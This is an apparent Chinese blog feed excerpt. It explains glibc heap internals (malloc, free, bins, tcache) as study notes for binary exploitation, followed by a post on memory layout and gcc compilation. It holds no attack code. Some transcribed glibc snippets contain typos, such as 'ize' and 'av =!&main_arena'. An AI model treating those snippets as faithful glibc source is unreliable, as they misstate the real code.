av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunk的大小如果满足要求，分配成功</span></span><br><span class="line">    <span class="comment">// 剩余的部分成为新的top chunk，同时也会成为remainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// 如果fast bin flag被设置，</span></span><br><span class="line">    <span class="comment">// 再重新release fast bin的内容到unsorted bin中，</span></span><br><span class="line">    <span class="comment">// 并且重新得到请求大小所在bin的index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果top chunk也不满足请求大小，</span></span><br><span class="line">    <span class="comment">// 就使用系统调用增加top chunk，或者再开辟出一块heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="free入口"><a href="#free入口" class="headerlink" title="free入口"></a>free入口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码分成了part1/2/3三部分：</p><ul><li>part1：调用回调函数，追代码可以发现，这个回调函数为NULL</li><li>part2：允许free(0)这样的调用，即什么都不做，直接返回</li><li>part3：判断所释放的空间是不是使用mmap分配得到的，如果是mmap分配得到的，就使用munmap来释放，如果不是的话，就调用_int_free这个主释放函数来释放，后面就来重点分析这个函数</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>先贴流程</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>根据上图，free时先是判断chunk size是不是处在fast bin的范围，是的话就把该chunk放入fast bin中，把chunk放入fast bin的操作是一个CAS操作.</p><p>通过代码实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码除了前面提到的CAS操作，还有两个点值得注意一下：</p><ul><li>使用free<em>perturb函数来改变一下所释放空间的原来内容，这个要在设置了glibc.malloc.perturb或者MALLOC_PERTURB</em>环境变量的时候才会起作用</li><li>PROTECT_PTR的底层原理实际上是一种safe-linking的安全机制，它利用了ASLR（地址空间布局随机化）中的随机性，可以很有效的防止UAF漏洞，这部分很有意思，黑客的入门题，以后有时间再专门写篇文章研究下，这里只简单提下</li></ul><p>如果chunk size不属于fast bin的范围，继续判断是不是由mmap分配产生，如果由mmap分配产生，则使用munmap_chunk这个函数来进行free，munmap_chunk的主要代码也一并列在了下面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 如果空间是由mmap分配的，则使用munmap_chunk释放</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunk的主要实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLRO是一个字符串连接宏，这里把dl_pagesize</span></span><br><span class="line">  <span class="comment">// 变成了_dl_pagesize，_dl_pagesize的值是4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// 通过下面这个check可以发现，mmap分配的</span></span><br><span class="line">  <span class="comment">// 空间地址和大小都必须是pagesize的倍数</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 继续调用__munmap来进行释放，</span></span><br><span class="line">  <span class="comment">// 追踪代码可以看到是由_vm_deallocate释放的空间</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个判断的原理很简单，都知道malloc的chunk header中有A、M、P 3个bit的flag，其中的M就是表示该chunk是不是由mmap系统调用产生，这个判断宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>如果chunk不是由mmap分配，先判断该chunk的prev chunk是不是free state，如果是的话，需要和prev chunk进行merge：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再判断next chunk是不是top chunk，是的话，重新设置top chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果next chunk不是top chunk，有两种情况，如果是free state的话，则继续merge，如果是allocated state的话，则改变其P(PREV_INUSE) flag，最后把要free的chunk放入unsorted bin中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>最后还要看下merge过后的chunk size是否达到FASTBIN_CONSOLIDATION_THRESHOLD这个阈值（默认大小是65536），达到的话要做一次malloc_consolidate操作（free fast bin中的chunk到unsorted bin中），对非main arena还要做一下heap_trim操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中的heap_for_ptr这个宏是用来得到当前heap的heap_info的，从它的定义可以验证heap_info这个数据结构的一些特性，值得看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="有tcache"><a href="#有tcache" class="headerlink" title="有tcache"></a>有tcache</h1><p>以上都是不考虑tcache的情况（libc&lt;2.26)，有tcache其实变化也并不是太大。</p><p>相关数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcache也是使用 类似 bins 方式来管理tcache 。</p><p><strong>tcache_perthread_struct是整个tcache</strong></p><p>每一项由 相同大小的 chunk 通过 tcache_entry 使用单向链表链接（类似于fastbin的链接方式）。</p><p><strong>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</strong></p><p>tcache_entry 用于链接 chunk 的结构体， 其中就只有一个 next 指针，指向下一个相同大小的 chunk.,也就说明tcache链上的成员只记录了fd指针</p><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这段代码能更好地理解上面两个结构体.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 chunk 放到 指定的 tcache-&gt;entries 里面去， tc_idx 通过 csize2tidx (nb) 计算得到 （nb是 chunk 的大小）。</p><p>它首先把 chunk+2<em>SIZE_SZ （就是除去 header 部分） 强制转换成 tcache_entry </em> 类型，e指针也就指向了mem,然后修改mem的头字段(现在被视为entery的next指针)为之前的该entery的第一个chunk,然后再把entery的值改为e指针,最后把 tcache-&gt;counts[tc_idx] 加 1 ，表示新增了一个 chunk 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>简单来说就是put的逆操作,不多说.</p><p><strong>得到tc_idx的宏定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <strong>tcache_perthread_struct</strong> 。</li><li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li><li><p>free 内存，且 size 小于 small bin size 时</p><ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）（<strong>p位不置零故不合并</strong>）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li><p>先从 tcache 取 chunk，直到 tcache 为空</p></li><li><p>tcache 为空后，从 bin 中找</p></li><li><p>tcache 为空时，如果 <strong>fastbin/smallbin/unsorted bin</strong>中有 size 符合的 chunk，会先把 <strong>fastbin/smallbin/unsorted bin</strong> 中的其他chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</p></li><li>上一条第三点详细说<ul><li>如果从 fastbin 中成功返回了一个需要的 chunk，那么对应 fastbin 中的其他 chunk 会被放进相应的 tcache bin 中，直到上限。需要注意的是 chunks 在 tcache bin 的顺序和在 fastbin 中的顺序是反过来的。</li><li>smallbin 中的情况与 fastbin 相似，双链表中的剩余 chunk 会被填充到 tcache bin 中，直到上限。</li><li>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache 会返回其中一个。</li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>这篇文章较上一篇更多东西是缝上去的,归纳整理的成分更多,自己总结的少一点。</p>]]></content>
    
    
    <summary type="html">更深入一点点</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>基础杂烩</title>
    <link href="https://ixout.github.io/posts/32771/"/>
    <id>https://ixout.github.io/posts/32771/</id>
    <published>2023-03-18T07:16:02.000Z</published>
    <updated>2023-06-04T14:37:25.332Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现自己对一些计算机系统的基础知识并不了解，目前暂时也没有精力去系统的学习，于是就将经常遇到的又不懂的知识归纳一下</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="虚拟地址与物理地址之间的映射"><a href="#虚拟地址与物理地址之间的映射" class="headerlink" title="虚拟地址与物理地址之间的映射"></a>虚拟地址与物理地址之间的映射</h2><p>先看一下进程虚拟地址空间的总体布局，以32位Linux系统为例：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>基于上图的虚拟地址空间布局来简单说下ELF文件是怎样映射到进程虚拟地址空间的，ELF文件被组织成如下图左列出的一系列section，其中具有相同属性（R/W/E）的section再组成一个segment，以segment为单位映射到进程的虚拟地址空间，其中虚拟地址空间中的segment要做到页大小对齐，下图也一同简要展示了虚拟地址空间到物理地址空间的映射，通过MMU完成。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>其它系统原理类似，都是将可执行程序组织成若干segment连同用到的动态库和kernel映射到进程的虚拟地址空间，主要差别在于不同segment映射的起始地址、大小不同等，比如32位Linux系统的Text segment起址是0x08048000，64位Linux系统的Text segment起址是0x00400000，再比如相对32位Linux系统的kernel space是1G，32位Windows的kernel space是2G等等。</p><h2 id="main函数参数"><a href="#main函数参数" class="headerlink" title="main函数参数"></a>main函数参数</h2><p>学c语言时有没有学过忘了，反正我不会，了解一下</p><ul><li><p>int argc：这个东西是所有参数的个数，包括文件名</p></li><li><p>char* argv[]：这个东西里面，argv[]是argc个参数，其中第0个参数即argv[0]是程序的全名，后面跟着的就是用户输入的参数了</p></li><li>char* envp[]：这个东西用来取得系统的环境变量，envp保存了系统所有的环境变量路径</li></ul><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><p>过程可分为4个步骤：预处理（Preprocessing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_110757.png" alt=""></p><p>以hello word 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;hello.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span>;</span><br><span class="line">......</span><br><span class="line">main() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预编译过程主要处理源代码中以 “#” 开始的预编译指令：</p><ul><li>将所有的 “#define” 删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，如 “#if”、“#ifdef”、“#elif”、“#else”、“#endif”。</li><li>处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，该过程递归执行。</li><li>删除所有注释。</li><li>添加行号和文件名标号。</li><li>保留所有的 #pragma 编译器指令。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;hello.c&quot;</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello, world&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        leaq    .LC0(%rip), %rdi</span><br><span class="line">        call    puts@PLT</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (GNU) 7.2.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br><span class="line">或者</span><br><span class="line">$gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 